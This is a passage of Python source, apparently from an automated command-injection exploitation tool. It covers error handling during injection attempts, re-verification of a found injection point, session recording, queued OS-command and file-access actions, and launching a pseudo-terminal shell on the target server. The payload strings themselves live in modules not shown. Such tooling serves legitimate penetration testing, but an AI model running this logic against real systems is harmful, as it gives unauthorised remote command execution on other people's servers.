                        if checks.finalize(exit_loops, no_result, i, total, injection_type, technique, shell):
                          continue
                        else:
                          raise
                      # Truthy means the tempfile-based fallback already handled it - stop here.
                      if checks.use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response):
                        return True
                    else:
                      if checks.finalize(exit_loops, no_result, i, total, injection_type, technique, shell):
                        continue
                      else:
                        raise

                  elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:
                    err_msg = "You need authorization to access this page: '" + settings.DEFINED_WEBROOT + "'."
                    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                    checks.quit(filename, url, hard_exit=False)

                  elif str(e.getcode()) == settings.FORBIDDEN_ERROR:
                    err_msg = "You do not have access to this page: '" + settings.DEFINED_WEBROOT + "'."
                    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                    checks.quit(filename, url, hard_exit=False)

            except KeyboardInterrupt:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                # Delete previous shell (text) files (output)
                if 'vuln_parameter' in locals():
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
              else:
                settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
              # Always raises; let injection_process() handle the skip/end/next/quit action.
              checks.handle_detection_interrupt(filename, url)

            except SystemExit:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                if 'vuln_parameter' in locals():
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique)
              else:
                settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
              raise

            except _urllib.error.URLError as e:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                warn_msg = "It seems you do not have permission to "
                warn_msg += "read and/or write files in directory '" + settings.WEB_ROOT + "'."
                settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
                err_msg = str(e).replace(": "," (") + ")."
                if settings.VERBOSITY_LEVEL >= 2:
                  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                # Provide custom server's root directory.
                if not settings.USER_APPLIED_WEB_ROOT:
                  settings.CUSTOM_WEB_ROOT = False
                  checks.custom_web_root(url, timesec, filename, http_request_method, url_time_response)
                continue

            except EOFError:
              checks.EOFError_err_msg()
              raise

            except Exception:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                raise
              else:
                continue

          # Yaw, got shellz!
          # Do some magic tricks!
          if shell and not resumed:
            # Re-verify with a fresh marker/pair each round.
            checks.check_for_false_positive_result(False)
            verified = True
            if technique == settings.INJECTION_TECHNIQUE.FILE_BASED and settings.TARGET_OS != settings.OS.WINDOWS:
              # One write + one fetch for all rounds, not a cycle per round.
              verify_tags = [''.join(random.choice(string.ascii_uppercase) for _ in range(6)) for _ in range(settings.RESULTS_BASED_VERIFY_ROUNDS)]
              if interpreter:
                verify_payload = payloads.decision_combined_alter_interpreter(separator, verify_tags, OUTPUT_TEXTFILE)
              else:
                verify_payload = payloads.decision_combined(separator, verify_tags, OUTPUT_TEXTFILE)
              requests.perform_injection(prefix, suffix, whitespace, verify_payload, "", http_request_method, url)
              time.sleep(timesec)
              verify_output = injector.injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
              verify_response = checks.get_response(verify_output)
              verify_html_data = "" if type(verify_response) is bool else checks.process_page_content(verify_response, action="decode")
              # Tags must appear in order - rules out a stale/cached file.
              verified = re.search(r"" + r".*?".join(verify_tags) + r"", str(verify_html_data), re.DOTALL) is not None
            else:
              for _verify_round in range(settings.RESULTS_BASED_VERIFY_ROUNDS):
                verify_tag = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  if interpreter:
                    verify_payload = payloads.decision_alter_interpreter(separator, verify_tag, OUTPUT_TEXTFILE)
                  else:
                    verify_payload = payloads.decision(separator, verify_tag, OUTPUT_TEXTFILE)
                  requests.perform_injection(prefix, suffix, whitespace, verify_payload, "", http_request_method, url)
                  time.sleep(timesec)
                  verify_output = injector.injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
                  verify_response = checks.get_response(verify_output)
                  verify_html_data = "" if type(verify_response) is bool else checks.process_page_content(verify_response, action="decode")
                  verify_shell = re.findall(r"" + verify_tag + "", str(verify_html_data))
                  verified = bool(verify_shell) and verify_shell[0] == verify_tag
                else:
                  verify_randv1 = random.randrange(100)
                  verify_randv2 = random.randrange(100)
                  verify_randvcalc = verify_randv1 + verify_randv2
                  if interpreter:
                    verify_payload = payloads.decision_alter_interpreter(separator, verify_tag, verify_randv1, verify_randv2)
                  else:
                    verify_payload = payloads.decision(separator, verify_tag, verify_randv1, verify_randv2)
                  verify_response, _, verify_payload, _, _ = requests.perform_injection(prefix, suffix, whitespace, verify_payload, "", http_request_method, url)
                  if settings.URL_RELOAD:
                    verify_response = requests.url_reload(url, timesec)
                  time.sleep(timesec)
                  verified = bool(injector.injection_test_results(verify_response, verify_tag, verify_randvcalc, technique, verify_payload))
                if not verified:
                  break
            if not verified:
              checks.unexploitable_point()
              shell = False
            elif settings.VERBOSITY_LEVEL == 0:
              settings.print_data_to_stdout(" (done)")
              settings.close_progress_line()
          if shell:
            found = True
            no_result = False
            # Export session
            if not resumed:
              checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, counter, checks.finding_title(separator, whitespace, bare_prefix, bare_suffix))
              session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell[0], vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
            else:
              whitespace = settings.WHITESPACES[0]
            if not resumed:
              settings.CONFIRMED_BOUNDARY[settings.CHECKING_PARAMETER] = (bare_prefix, bare_suffix, separator, whitespace)
            cmd = maxlen =  ""
            if not 'url_time_response' in locals():
              url_time_response = ""
            if technique != settings.INJECTION_TECHNIQUE.FILE_BASED:
              OUTPUT_TEXTFILE = ""
            # Registered here, run once at quit().
            _register_post_detection_action(lambda: enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique))
            _register_post_detection_action(lambda: file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique))
            if menu.options.os_cmd:
              def _run_os_cmd(separator=separator, maxlen=maxlen, TAG=TAG, cmd=menu.options.os_cmd, prefix=prefix, suffix=suffix, whitespace=whitespace, timesec=timesec, http_request_method=http_request_method, url=url, vuln_parameter=vuln_parameter, OUTPUT_TEXTFILE=OUTPUT_TEXTFILE, interpreter=interpreter, filename=filename, url_time_response=url_time_response, technique=technique):
                if settings.OS_CMD_DONE:
                  return
                settings.OS_CMD_DONE = True
                enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
              _register_post_detection_action(_run_os_cmd)
            # Pseudo-Terminal shell
            if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
              continue
            else:
              return

  return exit_handler(no_result)